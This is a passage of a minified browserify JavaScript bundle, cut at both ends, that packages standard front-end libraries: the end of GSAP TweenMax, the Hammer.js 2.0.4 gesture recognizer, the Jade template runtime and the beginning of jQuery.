e,i=t.propName,s=t.priority||0,r=t.overwriteProps,n={init:"_onInitTween",set:"setRatio",kill:"_kill",round:"_roundProps",initAll:"_onInitAllProps"},a=g("plugins."+i.charAt(0).toUpperCase()+i.substr(1)+"Plugin",function(){Q.call(this,i,s),this._overwriteProps=r||[]},t.global===!0),o=a.prototype=new Q(i);o.constructor=a,a.API=t.API;for(e in n)"function"==typeof t[e]&&(o[n[e]]=t[e]);return a.version=t.version,Q.activate([a]),a},s=t._gsQueue){for(r=0;r<s.length;r++)s[r]();for(n in p)p[n].func||t.console.log("GSAP encountered missing dependency: com.greensock."+n)}o=!1}}("undefined"!=typeof module&&module.exports&&"undefined"!=typeof global?global:this||window,"TweenMax");
}).call(this,typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})
},{}],4:[function(require,module,exports){
!function(t,e,i,n){"use strict";function r(t,e,i){return setTimeout(c(t,i),e)}function s(t,e,i){return Array.isArray(t)?(o(t,i[e],i),!0):!1}function o(t,e,i){var r;if(t)if(t.forEach)t.forEach(e,i);else if(t.length!==n)for(r=0;r<t.length;)e.call(i,t[r],r,t),r++;else for(r in t)t.hasOwnProperty(r)&&e.call(i,t[r],r,t)}function a(t,e,i){for(var r=Object.keys(e),s=0;s<r.length;)(!i||i&&t[r[s]]===n)&&(t[r[s]]=e[r[s]]),s++;return t}function h(t,e){return a(t,e,!0)}function u(t,e,i){var n,r=e.prototype;n=t.prototype=Object.create(r),n.constructor=t,n._super=r,i&&a(n,i)}function c(t,e){return function(){return t.apply(e,arguments)}}function l(t,e){return typeof t==ct?t.apply(e?e[0]||n:n,e):t}function p(t,e){return t===n?e:t}function f(t,e,i){o(g(e),function(e){t.addEventListener(e,i,!1)})}function d(t,e,i){o(g(e),function(e){t.removeEventListener(e,i,!1)})}function v(t,e){for(;t;){if(t==e)return!0;t=t.parentNode}return!1}function m(t,e){return t.indexOf(e)>-1}function g(t){return t.trim().split(/\s+/g)}function T(t,e,i){if(t.indexOf&&!i)return t.indexOf(e);for(var n=0;n<t.length;){if(i&&t[n][i]==e||!i&&t[n]===e)return n;n++}return-1}function y(t){return Array.prototype.slice.call(t,0)}function E(t,e,i){for(var n=[],r=[],s=0;s<t.length;){var o=e?t[s][e]:t[s];T(r,o)<0&&n.push(t[s]),r[s]=o,s++}return i&&(n=e?n.sort(function(t,i){return t[e]>i[e]}):n.sort()),n}function I(t,e){for(var i,r,s=e[0].toUpperCase()+e.slice(1),o=0;o<ht.length;){if(i=ht[o],r=i?i+s:e,r in t)return r;o++}return n}function A(){return dt++}function _(t){var e=t.ownerDocument;return e.defaultView||e.parentWindow}function D(t,e){var i=this;this.manager=t,this.callback=e,this.element=t.element,this.target=t.options.inputTarget,this.domHandler=function(e){l(t.options.enable,[t])&&i.handler(e)},this.init()}function S(t){var e,i=t.options.inputClass;return new(e=i?i:gt?W:Tt?H:mt?U:F)(t,w)}function w(t,e,i){var n=i.pointers.length,r=i.changedPointers.length,s=e&Dt&&n-r===0,o=e&(wt|bt)&&n-r===0;i.isFirst=!!s,i.isFinal=!!o,s&&(t.session={}),i.eventType=e,b(t,i),t.emit("hammer.input",i),t.recognize(i),t.session.prevInput=i}function b(t,e){var i=t.session,n=e.pointers,r=n.length;i.firstInput||(i.firstInput=z(e)),r>1&&!i.firstMultiple?i.firstMultiple=z(e):1===r&&(i.firstMultiple=!1);var s=i.firstInput,o=i.firstMultiple,a=o?o.center:s.center,h=e.center=N(n);e.timeStamp=ft(),e.deltaTime=e.timeStamp-s.timeStamp,e.angle=x(a,h),e.distance=O(a,h),C(i,e),e.offsetDirection=M(e.deltaX,e.deltaY),e.scale=o?Y(o.pointers,n):1,e.rotation=o?X(o.pointers,n):0,R(i,e);var u=t.element;v(e.srcEvent.target,u)&&(u=e.srcEvent.target),e.target=u}function C(t,e){var i=e.center,n=t.offsetDelta||{},r=t.prevDelta||{},s=t.prevInput||{};(e.eventType===Dt||s.eventType===wt)&&(r=t.prevDelta={x:s.deltaX||0,y:s.deltaY||0},n=t.offsetDelta={x:i.x,y:i.y}),e.deltaX=r.x+(i.x-n.x),e.deltaY=r.y+(i.y-n.y)}function R(t,e){var i,r,s,o,a=t.lastInterval||e,h=e.timeStamp-a.timeStamp;if(e.eventType!=bt&&(h>_t||a.velocity===n)){var u=a.deltaX-e.deltaX,c=a.deltaY-e.deltaY,l=P(h,u,c);r=l.x,s=l.y,i=pt(l.x)>pt(l.y)?l.x:l.y,o=M(u,c),t.lastInterval=e}else i=a.velocity,r=a.velocityX,s=a.velocityY,o=a.direction;e.velocity=i,e.velocityX=r,e.velocityY=s,e.direction=o}function z(t){for(var e=[],i=0;i<t.pointers.length;)e[i]={clientX:lt(t.pointers[i].clientX),clientY:lt(t.pointers[i].clientY)},i++;return{timeStamp:ft(),pointers:e,center:N(e),deltaX:t.deltaX,deltaY:t.deltaY}}function N(t){var e=t.length;if(1===e)return{x:lt(t[0].clientX),y:lt(t[0].clientY)};for(var i=0,n=0,r=0;e>r;)i+=t[r].clientX,n+=t[r].clientY,r++;return{x:lt(i/e),y:lt(n/e)}}function P(t,e,i){return{x:e/t||0,y:i/t||0}}function M(t,e){return t===e?Ct:pt(t)>=pt(e)?t>0?Rt:zt:e>0?Nt:Pt}function O(t,e,i){i||(i=Xt);var n=e[i[0]]-t[i[0]],r=e[i[1]]-t[i[1]];return Math.sqrt(n*n+r*r)}function x(t,e,i){i||(i=Xt);var n=e[i[0]]-t[i[0]],r=e[i[1]]-t[i[1]];return 180*Math.atan2(r,n)/Math.PI}function X(t,e){return x(e[1],e[0],Yt)-x(t[1],t[0],Yt)}function Y(t,e){return O(e[0],e[1],Yt)/O(t[0],t[1],Yt)}function F(){this.evEl=Wt,this.evWin=qt,this.allow=!0,this.pressed=!1,D.apply(this,arguments)}function W(){this.evEl=kt,this.evWin=Ut,D.apply(this,arguments),this.store=this.manager.session.pointerEvents=[]}function q(){this.evTarget=Vt,this.evWin=jt,this.started=!1,D.apply(this,arguments)}function L(t,e){var i=y(t.touches),n=y(t.changedTouches);return e&(wt|bt)&&(i=E(i.concat(n),"identifier",!0)),[i,n]}function H(){this.evTarget=Bt,this.targetIds={},D.apply(this,arguments)}function k(t,e){var i=y(t.touches),n=this.targetIds;if(e&(Dt|St)&&1===i.length)return n[i[0].identifier]=!0,[i,i];var r,s,o=y(t.changedTouches),a=[],h=this.target;if(s=i.filter(function(t){return v(t.target,h)}),e===Dt)for(r=0;r<s.length;)n[s[r].identifier]=!0,r++;for(r=0;r<o.length;)n[o[r].identifier]&&a.push(o[r]),e&(wt|bt)&&delete n[o[r].identifier],r++;return a.length?[E(s.concat(a),"identifier",!0),a]:void 0}function U(){D.apply(this,arguments);var t=c(this.handler,this);this.touch=new H(this.manager,t),this.mouse=new F(this.manager,t)}function G(t,e){this.manager=t,this.set(e)}function V(t){if(m(t,ee))return ee;var e=m(t,ie),i=m(t,ne);return e&&i?ie+" "+ne:e||i?e?ie:ne:m(t,te)?te:$t}function j(t){this.id=A(),this.manager=null,this.options=h(t||{},this.defaults),this.options.enable=p(this.options.enable,!0),this.state=re,this.simultaneous={},this.requireFail=[]}function Z(t){return t&ue?"cancel":t&ae?"end":t&oe?"move":t&se?"start":""}function B(t){return t==Pt?"down":t==Nt?"up":t==Rt?"left":t==zt?"right":""}function J(t,e){var i=e.manager;return i?i.get(t):t}function K(){j.apply(this,arguments)}function Q(){K.apply(this,arguments),this.pX=null,this.pY=null}function $(){K.apply(this,arguments)}function tt(){j.apply(this,arguments),this._timer=null,this._input=null}function et(){K.apply(this,arguments)}function it(){K.apply(this,arguments)}function nt(){j.apply(this,arguments),this.pTime=!1,this.pCenter=!1,this._timer=null,this._input=null,this.count=0}function rt(t,e){return e=e||{},e.recognizers=p(e.recognizers,rt.defaults.preset),new st(t,e)}function st(t,e){e=e||{},this.options=h(e,rt.defaults),this.options.inputTarget=this.options.inputTarget||t,this.handlers={},this.session={},this.recognizers=[],this.element=t,this.input=S(this),this.touchAction=new G(this,this.options.touchAction),ot(this,!0),o(e.recognizers,function(t){var e=this.add(new t[0](t[1]));t[2]&&e.recognizeWith(t[2]),t[3]&&e.requireFailure(t[3])},this)}function ot(t,e){var i=t.element;o(t.options.cssProps,function(t,n){i.style[I(i.style,n)]=e?t:""})}function at(t,i){var n=e.createEvent("Event");n.initEvent(t,!0,!0),n.gesture=i,i.target.dispatchEvent(n)}var ht=["","webkit","moz","MS","ms","o"],ut=e.createElement("div"),ct="function",lt=Math.round,pt=Math.abs,ft=Date.now,dt=1,vt=/mobile|tablet|ip(ad|hone|od)|android/i,mt="ontouchstart"in t,gt=I(t,"PointerEvent")!==n,Tt=mt&&vt.test(navigator.userAgent),yt="touch",Et="pen",It="mouse",At="kinect",_t=25,Dt=1,St=2,wt=4,bt=8,Ct=1,Rt=2,zt=4,Nt=8,Pt=16,Mt=Rt|zt,Ot=Nt|Pt,xt=Mt|Ot,Xt=["x","y"],Yt=["clientX","clientY"];D.prototype={handler:function(){},init:function(){this.evEl&&f(this.element,this.evEl,this.domHandler),this.evTarget&&f(this.target,this.evTarget,this.domHandler),this.evWin&&f(_(this.element),this.evWin,this.domHandler)},destroy:function(){this.evEl&&d(this.element,this.evEl,this.domHandler),this.evTarget&&d(this.target,this.evTarget,this.domHandler),this.evWin&&d(_(this.element),this.evWin,this.domHandler)}};var Ft={mousedown:Dt,mousemove:St,mouseup:wt},Wt="mousedown",qt="mousemove mouseup";u(F,D,{handler:function(t){var e=Ft[t.type];e&Dt&&0===t.button&&(this.pressed=!0),e&St&&1!==t.which&&(e=wt),this.pressed&&this.allow&&(e&wt&&(this.pressed=!1),this.callback(this.manager,e,{pointers:[t],changedPointers:[t],pointerType:It,srcEvent:t}))}});var Lt={pointerdown:Dt,pointermove:St,pointerup:wt,pointercancel:bt,pointerout:bt},Ht={2:yt,3:Et,4:It,5:At},kt="pointerdown",Ut="pointermove pointerup pointercancel";t.MSPointerEvent&&(kt="MSPointerDown",Ut="MSPointerMove MSPointerUp MSPointerCancel"),u(W,D,{handler:function(t){var e=this.store,i=!1,n=t.type.toLowerCase().replace("ms",""),r=Lt[n],s=Ht[t.pointerType]||t.pointerType,o=s==yt,a=T(e,t.pointerId,"pointerId");r&Dt&&(0===t.button||o)?0>a&&(e.push(t),a=e.length-1):r&(wt|bt)&&(i=!0),0>a||(e[a]=t,this.callback(this.manager,r,{pointers:e,changedPointers:[t],pointerType:s,srcEvent:t}),i&&e.splice(a,1))}});var Gt={touchstart:Dt,touchmove:St,touchend:wt,touchcancel:bt},Vt="touchstart",jt="touchstart touchmove touchend touchcancel";u(q,D,{handler:function(t){var e=Gt[t.type];if(e===Dt&&(this.started=!0),this.started){var i=L.call(this,t,e);e&(wt|bt)&&i[0].length-i[1].length===0&&(this.started=!1),this.callback(this.manager,e,{pointers:i[0],changedPointers:i[1],pointerType:yt,srcEvent:t})}}});var Zt={touchstart:Dt,touchmove:St,touchend:wt,touchcancel:bt},Bt="touchstart touchmove touchend touchcancel";u(H,D,{handler:function(t){var e=Zt[t.type],i=k.call(this,t,e);i&&this.callback(this.manager,e,{pointers:i[0],changedPointers:i[1],pointerType:yt,srcEvent:t})}}),u(U,D,{handler:function(t,e,i){var n=i.pointerType==yt,r=i.pointerType==It;if(n)this.mouse.allow=!1;else if(r&&!this.mouse.allow)return;e&(wt|bt)&&(this.mouse.allow=!0),this.callback(t,e,i)},destroy:function(){this.touch.destroy(),this.mouse.destroy()}});var Jt=I(ut.style,"touchAction"),Kt=Jt!==n,Qt="compute",$t="auto",te="manipulation",ee="none",ie="pan-x",ne="pan-y";G.prototype={set:function(t){t==Qt&&(t=this.compute()),Kt&&(this.manager.element.style[Jt]=t),this.actions=t.toLowerCase().trim()},update:function(){this.set(this.manager.options.touchAction)},compute:function(){var t=[];return o(this.manager.recognizers,function(e){l(e.options.enable,[e])&&(t=t.concat(e.getTouchAction()))}),V(t.join(" "))},preventDefaults:function(t){if(!Kt){var e=t.srcEvent,i=t.offsetDirection;if(this.manager.session.prevented)return void e.preventDefault();var n=this.actions,r=m(n,ee),s=m(n,ne),o=m(n,ie);return r||s&&i&Mt||o&&i&Ot?this.preventSrc(e):void 0}},preventSrc:function(t){this.manager.session.prevented=!0,t.preventDefault()}};var re=1,se=2,oe=4,ae=8,he=ae,ue=16,ce=32;j.prototype={defaults:{},set:function(t){return a(this.options,t),this.manager&&this.manager.touchAction.update(),this},recognizeWith:function(t){if(s(t,"recognizeWith",this))return this;var e=this.simultaneous;return t=J(t,this),e[t.id]||(e[t.id]=t,t.recognizeWith(this)),this},dropRecognizeWith:function(t){return s(t,"dropRecognizeWith",this)?this:(t=J(t,this),delete this.simultaneous[t.id],this)},requireFailure:function(t){if(s(t,"requireFailure",this))return this;var e=this.requireFail;return t=J(t,this),-1===T(e,t)&&(e.push(t),t.requireFailure(this)),this},dropRequireFailure:function(t){if(s(t,"dropRequireFailure",this))return this;t=J(t,this);var e=T(this.requireFail,t);return e>-1&&this.requireFail.splice(e,1),this},hasRequireFailures:function(){return this.requireFail.length>0},canRecognizeWith:function(t){return!!this.simultaneous[t.id]},emit:function(t){function e(e){i.manager.emit(i.options.event+(e?Z(n):""),t)}var i=this,n=this.state;ae>n&&e(!0),e(),n>=ae&&e(!0)},tryEmit:function(t){return this.canEmit()?this.emit(t):void(this.state=ce)},canEmit:function(){for(var t=0;t<this.requireFail.length;){if(!(this.requireFail[t].state&(ce|re)))return!1;t++}return!0},recognize:function(t){var e=a({},t);return l(this.options.enable,[this,e])?(this.state&(he|ue|ce)&&(this.state=re),this.state=this.process(e),void(this.state&(se|oe|ae|ue)&&this.tryEmit(e))):(this.reset(),void(this.state=ce))},process:function(t){},getTouchAction:function(){},reset:function(){}},u(K,j,{defaults:{pointers:1},attrTest:function(t){var e=this.options.pointers;return 0===e||t.pointers.length===e},process:function(t){var e=this.state,i=t.eventType,n=e&(se|oe),r=this.attrTest(t);return n&&(i&bt||!r)?e|ue:n||r?i&wt?e|ae:e&se?e|oe:se:ce}}),u(Q,K,{defaults:{event:"pan",threshold:10,pointers:1,direction:xt},getTouchAction:function(){var t=this.options.direction,e=[];return t&Mt&&e.push(ne),t&Ot&&e.push(ie),e},directionTest:function(t){var e=this.options,i=!0,n=t.distance,r=t.direction,s=t.deltaX,o=t.deltaY;return r&e.direction||(e.direction&Mt?(r=0===s?Ct:0>s?Rt:zt,i=s!=this.pX,n=Math.abs(t.deltaX)):(r=0===o?Ct:0>o?Nt:Pt,i=o!=this.pY,n=Math.abs(t.deltaY))),t.direction=r,i&&n>e.threshold&&r&e.direction},attrTest:function(t){return K.prototype.attrTest.call(this,t)&&(this.state&se||!(this.state&se)&&this.directionTest(t))},emit:function(t){this.pX=t.deltaX,this.pY=t.deltaY;var e=B(t.direction);e&&this.manager.emit(this.options.event+e,t),this._super.emit.call(this,t)}}),u($,K,{defaults:{event:"pinch",threshold:0,pointers:2},getTouchAction:function(){return[ee]},attrTest:function(t){return this._super.attrTest.call(this,t)&&(Math.abs(t.scale-1)>this.options.threshold||this.state&se)},emit:function(t){if(this._super.emit.call(this,t),1!==t.scale){var e=t.scale<1?"in":"out";this.manager.emit(this.options.event+e,t)}}}),u(tt,j,{defaults:{event:"press",pointers:1,time:500,threshold:5},getTouchAction:function(){return[$t]},process:function(t){var e=this.options,i=t.pointers.length===e.pointers,n=t.distance<e.threshold,s=t.deltaTime>e.time;if(this._input=t,!n||!i||t.eventType&(wt|bt)&&!s)this.reset();else if(t.eventType&Dt)this.reset(),this._timer=r(function(){this.state=he,this.tryEmit()},e.time,this);else if(t.eventType&wt)return he;return ce},reset:function(){clearTimeout(this._timer)},emit:function(t){this.state===he&&(t&&t.eventType&wt?this.manager.emit(this.options.event+"up",t):(this._input.timeStamp=ft(),this.manager.emit(this.options.event,this._input)))}}),u(et,K,{defaults:{event:"rotate",threshold:0,pointers:2},getTouchAction:function(){return[ee]},attrTest:function(t){return this._super.attrTest.call(this,t)&&(Math.abs(t.rotation)>this.options.threshold||this.state&se)}}),u(it,K,{defaults:{event:"swipe",threshold:10,velocity:.65,direction:Mt|Ot,pointers:1},getTouchAction:function(){return Q.prototype.getTouchAction.call(this)},attrTest:function(t){var e,i=this.options.direction;return i&(Mt|Ot)?e=t.velocity:i&Mt?e=t.velocityX:i&Ot&&(e=t.velocityY),this._super.attrTest.call(this,t)&&i&t.direction&&t.distance>this.options.threshold&&pt(e)>this.options.velocity&&t.eventType&wt},emit:function(t){var e=B(t.direction);e&&this.manager.emit(this.options.event+e,t),this.manager.emit(this.options.event,t)}}),u(nt,j,{defaults:{event:"tap",pointers:1,taps:1,interval:300,time:250,threshold:2,posThreshold:10},getTouchAction:function(){return[te]},process:function(t){var e=this.options,i=t.pointers.length===e.pointers,n=t.distance<e.threshold,s=t.deltaTime<e.time;if(this.reset(),t.eventType&Dt&&0===this.count)return this.failTimeout();if(n&&s&&i){if(t.eventType!=wt)return this.failTimeout();var o=this.pTime?t.timeStamp-this.pTime<e.interval:!0,a=!this.pCenter||O(this.pCenter,t.center)<e.posThreshold;this.pTime=t.timeStamp,this.pCenter=t.center,a&&o?this.count+=1:this.count=1,this._input=t;var h=this.count%e.taps;if(0===h)return this.hasRequireFailures()?(this._timer=r(function(){this.state=he,this.tryEmit()},e.interval,this),se):he}return ce},failTimeout:function(){return this._timer=r(function(){this.state=ce},this.options.interval,this),ce},reset:function(){clearTimeout(this._timer)},emit:function(){this.state==he&&(this._input.tapCount=this.count,this.manager.emit(this.options.event,this._input))}}),rt.VERSION="2.0.4",rt.defaults={domEvents:!1,touchAction:Qt,enable:!0,inputTarget:null,inputClass:null,preset:[[et,{enable:!1}],[$,{enable:!1},["rotate"]],[it,{direction:Mt}],[Q,{direction:Mt},["swipe"]],[nt],[nt,{event:"doubletap",taps:2},["tap"]],[tt]],cssProps:{userSelect:"none",touchSelect:"none",touchCallout:"none",contentZooming:"none",userDrag:"none",tapHighlightColor:"rgba(0,0,0,0)"}};var le=1,pe=2;st.prototype={set:function(t){return a(this.options,t),t.touchAction&&this.touchAction.update(),t.inputTarget&&(this.input.destroy(),this.input.target=t.inputTarget,this.input.init()),this},stop:function(t){this.session.stopped=t?pe:le},recognize:function(t){var e=this.session;if(!e.stopped){this.touchAction.preventDefaults(t);var i,n=this.recognizers,r=e.curRecognizer;(!r||r&&r.state&he)&&(r=e.curRecognizer=null);for(var s=0;s<n.length;)i=n[s],e.stopped===pe||r&&i!=r&&!i.canRecognizeWith(r)?i.reset():i.recognize(t),!r&&i.state&(se|oe|ae)&&(r=e.curRecognizer=i),s++}},get:function(t){if(t instanceof j)return t;for(var e=this.recognizers,i=0;i<e.length;i++)if(e[i].options.event==t)return e[i];return null},add:function(t){if(s(t,"add",this))return this;var e=this.get(t.options.event);return e&&this.remove(e),this.recognizers.push(t),t.manager=this,this.touchAction.update(),t},remove:function(t){if(s(t,"remove",this))return this;var e=this.recognizers;return t=this.get(t),e.splice(T(e,t),1),this.touchAction.update(),this},on:function(t,e){var i=this.handlers;return o(g(t),function(t){i[t]=i[t]||[],i[t].push(e)}),this},off:function(t,e){var i=this.handlers;return o(g(t),function(t){e?i[t].splice(T(i[t],e),1):delete i[t]}),this},emit:function(t,e){this.options.domEvents&&at(t,e);var i=this.handlers[t]&&this.handlers[t].slice();if(i&&i.length){e.type=t,e.preventDefault=function(){e.srcEvent.preventDefault()};for(var n=0;n<i.length;)i[n](e),n++}},destroy:function(){this.element&&ot(this,!1),this.handlers={},this.session={},this.input.destroy(),this.element=null}},a(rt,{INPUT_START:Dt,INPUT_MOVE:St,INPUT_END:wt,INPUT_CANCEL:bt,STATE_POSSIBLE:re,STATE_BEGAN:se,STATE_CHANGED:oe,STATE_ENDED:ae,STATE_RECOGNIZED:he,STATE_CANCELLED:ue,STATE_FAILED:ce,DIRECTION_NONE:Ct,DIRECTION_LEFT:Rt,DIRECTION_RIGHT:zt,DIRECTION_UP:Nt,DIRECTION_DOWN:Pt,DIRECTION_HORIZONTAL:Mt,DIRECTION_VERTICAL:Ot,DIRECTION_ALL:xt,Manager:st,Input:D,TouchAction:G,TouchInput:H,MouseInput:F,PointerEventInput:W,TouchMouseInput:U,SingleTouchInput:q,Recognizer:j,AttrRecognizer:K,Tap:nt,Pan:Q,Swipe:it,Pinch:$,Rotate:et,Press:tt,on:f,off:d,each:o,merge:h,extend:a,inherit:u,bindFn:c,prefixed:I}),typeof define==ct&&define.amd?define(function(){return rt}):"undefined"!=typeof module&&module.exports?module.exports=rt:t[i]=rt}(window,document,"Hammer");
},{}],5:[function(require,module,exports){
(function (global){
!function(e){if("object"==typeof exports&&"undefined"!=typeof module)module.exports=e();else if("function"==typeof define&&define.amd)define([],e);else{var n;n="undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this,n.jade=e()}}(function(){return function e(n,t,r){function o(a,f){if(!t[a]){if(!n[a]){var s="function"==typeof require&&require;if(!f&&s)return s(a,!0);if(i)return i(a,!0);var u=new Error("Cannot find module '"+a+"'");throw u.code="MODULE_NOT_FOUND",u}var l=t[a]={exports:{}};n[a][0].call(l.exports,function(e){var t=n[a][1][e];return o(t?t:e)},l,l.exports,e,n,t,r)}return t[a].exports}for(var i="function"==typeof require&&require,a=0;a<r.length;a++)o(r[a]);return o}({1:[function(e,n,t){"use strict";function r(e){return null!=e&&""!==e}function o(e){return(Array.isArray(e)?e.map(o):e&&"object"==typeof e?Object.keys(e).filter(function(n){return e[n]}):[e]).filter(r).join(" ")}function i(e){return f[e]||e}function a(e){var n=String(e).replace(s,i);return n===""+e?e:n}t.merge=function u(e,n){if(1===arguments.length){for(var t=e[0],o=1;o<e.length;o++)t=u(t,e[o]);return t}var i=e["class"],a=n["class"];(i||a)&&(i=i||[],a=a||[],Array.isArray(i)||(i=[i]),Array.isArray(a)||(a=[a]),e["class"]=i.concat(a).filter(r));for(var f in n)"class"!=f&&(e[f]=n[f]);return e},t.joinClasses=o,t.cls=function(e,n){for(var r=[],i=0;i<e.length;i++)n&&n[i]?r.push(t.escape(o([e[i]]))):r.push(o(e[i]));var a=o(r);return a.length?' class="'+a+'"':""},t.style=function(e){return e&&"object"==typeof e?Object.keys(e).map(function(n){return n+":"+e[n]}).join(";"):e},t.attr=function(e,n,r,o){return"style"===e&&(n=t.style(n)),"boolean"==typeof n||null==n?n?" "+(o?e:e+'="'+e+'"'):"":0==e.indexOf("data")&&"string"!=typeof n?(-1!==JSON.stringify(n).indexOf("&")&&console.warn("Since Jade 2.0.0, ampersands (`&`) in data attributes will be escaped to `&amp;`"),n&&"function"==typeof n.toISOString&&console.warn("Jade will eliminate the double quotes around dates in ISO form after 2.0.0")," "+e+"='"+JSON.stringify(n).replace(/'/g,"&apos;")+"'"):r?(n&&"function"==typeof n.toISOString&&console.warn("Jade will stringify dates in ISO form after 2.0.0")," "+e+'="'+t.escape(n)+'"'):(n&&"function"==typeof n.toISOString&&console.warn("Jade will stringify dates in ISO form after 2.0.0")," "+e+'="'+n+'"')},t.attrs=function(e,n){var r=[],i=Object.keys(e);if(i.length)for(var a=0;a<i.length;++a){var f=i[a],s=e[f];"class"==f?(s=o(s))&&r.push(" "+f+'="'+s+'"'):r.push(t.attr(f,s,!1,n))}return r.join("")};var f={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"},s=/[&<>"]/g;t.escape=a,t.rethrow=function l(n,t,r,o){if(!(n instanceof Error))throw n;if(!("undefined"==typeof window&&t||o))throw n.message+=" on line "+r,n;try{o=o||e("fs").readFileSync(t,"utf8")}catch(i){l(n,null,r)}var a=3,f=o.split("\n"),s=Math.max(r-a,0),u=Math.min(f.length,r+a),a=f.slice(s,u).map(function(e,n){var t=n+s+1;return(t==r?"  > ":"    ")+t+"| "+e}).join("\n");throw n.path=t,n.message=(t||"Jade")+":"+r+"\n"+a+"\n\n"+n.message,n},t.DebugItem=function(e,n){this.lineno=e,this.filename=n}},{fs:2}],2:[function(e,n,t){},{}]},{},[1])(1)});
}).call(this,typeof global !== "undefined" ? global : typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : {})
},{}],6:[function(require,module,exports){
!function(e,t){"object"==typeof module&&"object"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error("jQuery requires a window with a document");return t(e)}:t(e)}("undefined"!=typeof window?window:this,function(e,t){function n(e){var t="length"in e&&e.length,n=Z.type(e);return"function"===n||Z.isWindow(e)?!1:1===e.nodeType&&t?!0:"array"===n||0===t||"number"==typeof t&&t>0&&t-1 in e}function r(e,t,n){if(Z.isFunction(t))return Z.grep(e,function(e,r){return!!t.call(e,r,e)!==n});if(t.nodeType)return Z.grep(e,function(e){return e===t!==n});if("string"==typeof t){if(ae.test(t))return Z.filter(t,e,n);t=Z.filter(t,e)}return Z.grep(e,function(e){return U.call(t,e)>=0!==n})}function i(e,t){for(;(e=e[t])&&1!==e.nodeType;);return e}function o(e){var t=he[e]={};return Z.each(e.match(de)||[],function(e,n){t[n]=!0}),t}function s(){J.removeEventListener("DOMContentLoaded",s,!1),e.removeEventListener("load",s,!1),Z.ready()}function a(){Object.defineProperty(this.cache={},0,{get:function(){return{}}}),this.expando=Z.expando+a.uid++}function u(e,t,n){var r;if(void 0===n&&1===e.nodeType)if(r="data-"+t.replace(be,"-$1").toLowerCase(),n=e.getAttribute(r),"string"==typeof n){try{n="true"===n?!0:"false"===n?!1:"null"===n?null:+n+""===n?+n:xe.test(n)?Z.parseJSON(n):n}catch(i){}ye.set(e,t,n)}else n=void 0;return n}function l(){return!0}function c(){return!1}function f(){try{return J.activeElement}catch(e){}}function p(e,t){return Z.nodeName(e,"table")&&Z.nodeName(11!==t.nodeType?t:t.firstChild,"tr")?e.getElementsByTagName("tbody")[0]||e.appendChild(e.ownerDocument.createElement("tbody")):e}function d(e){return e.type=(null!==e.getAttribute("type"))+"/"+e.type,e}function h(e){var t=Pe.exec(e.type);return t?e.type=t[1]:e.removeAttribute("type"),e}function g(e,t){for(var n=0,r=e.length;r>n;n++)ve.set(e[n],"globalEval",!t||ve.get(t[n],"globalEval"))}function m(e,t){var n,r,i,o,s,a,u,l;if(1===t.nodeType){if(ve.hasData(e)&&(o=ve.access(e),s=ve.set(t,o),l=o.events)){delete s.handle,s.events={};for(i in l)for(n=0,r=l[i].length;r>n;n++)Z.event.add(t,i,l[i][n])}ye.hasData(e)&&(a=ye.access(e),u=Z.extend({},a),ye.set(t,u))}}function v(e,t){var n=e.getElementsByTagName?e.getElementsByTagName(t||"*"):e.querySelectorAll?e.querySelectorAll(t||"*"):[];return void 0===t||t&&Z.nodeName(e,t)?Z.merge([e],n):n}function y(e,t){var n=t.nodeName.toLowerCase();"input"===n&&Ne.test(e.type)?t.checked=e.checked:("input"===n||"textarea"===n)&&(t.defaultValue=e.defaultValue)}function x(t,n){var r,i=Z(n.createElement(t)).appendTo(n.body),o=e.getDefaultComputedStyle&&(r=e.getDefaultComputedStyle(i[0]))?r.display:Z.css(i[0],"display");return i.detach(),o}function b(e){var t=J,n=$e[e];return n||(n=x(e,t),"none"!==n&&n||(We=(We||Z("<iframe frameborder='0' width='0' height='0'/>")).appendTo(t.documentElement),t=We[0].contentDocument,t.write(),t.close(),n=x(e,t),We.detach()),$e[e]=n),n}function w(e,t,n){var r,i,o,s,a=e.style;return n=n||_e(e),n&&(s=n.getPropertyValue(t)||n[t]),n&&(""!==s||Z.contains(e.ownerDocument,e)||(s=Z.style(e,t)),Be.test(s)&&Ie.test(t)&&(r=a.width,i=a.minWidth,o=a.maxWidth,a.minWidth=a.maxWidth=a.width=s,s=n.width,a.width=r,a.minWidth=i,a.maxWidth=o)),void 0!==s?s+"":s}function T(e,t){return{get:function(){return e()?void delete this.get:(this.get=t).apply(this,arguments)}}}function C(e,t){if(t in e)return t;for(var n=t[0].toUpperCase()+t.slice(1),r=t,i=Ge.length;i--;)if(t=Ge[i]+n,t in e)return t;return r}function N(e,t,n){var r=Xe.exec(t);return r?Math.max(0,r[1]-(n||0))+(r[2]||"px"):t}function k(e,t,n,r,i){for(var o=n===(r?"border":"content")?4:"width"===t?1:0,s=0;4>o;o+=2)"margin"===n&&(s+=Z.css(e,n+Te[o],!0,i)),r?("content"===n&&(s-=Z.css(e,"padding"+Te[o],!0,i)),"margin"!==n&&(s-=Z.css(e,"border"+Te[o]+"Width",!0,i))):(s+=Z.css(e,"padding"+Te[o],!0,i),"padding"!==n&&(s+=Z.css(e,"border"+Te[o]+"Width",!0,i)));return s}function E(e,t,n){var r=!0,i="width"===t?e.offsetWidth:e.offsetHeight,o=_e(e),s="border-box"===Z.css(e,"boxSizing",!1,o);if(0>=i||null==i){if(i=w(e,t,o),(0>i||null==i)&&(i=e.style[t]),Be.test(i))return i;r=s&&(Q.boxSizingReliable()||i===e.style[t]),i=parseFloat(i)||0}return i+k(e,t,n||(s?"border":"content"),r,o)+"px"}function S(e,t){for(var n,r,i,o=[],s=0,a=e.length;a>s;s++)r=e[s],r.style&&(o[s]=ve.get(r,"olddisplay"),n=r.style.display,t?(o[s]||"none"!==n||(r.style.display=""),""===r.style.display&&Ce(r)&&(o[s]=ve.access(r,"olddisplay",b(r.nodeName)))):(i=Ce(r),"none"===n&&i||ve.set(r,"olddisplay",i?n:Z.css(r,"display"))));for(s=0;a>s;s++)r=e[s],r.style&&(t&&"none"!==r.style.display&&""!==r.style.display||(r.style.display=t?o[s]||"":"none"));return e}function D(e,t,n,r,i){return new D.prototype.init(e,t,n,r,i)}function j(){return setTimeout(function(){Qe=void 0}),Qe=Z.now()}function A(e,t){var n,r=0,i={height:e};for(t=t?1:0;4>r;r+=2-t)n=Te[r],i["margin"+n]=i["padding"+n]=e;return 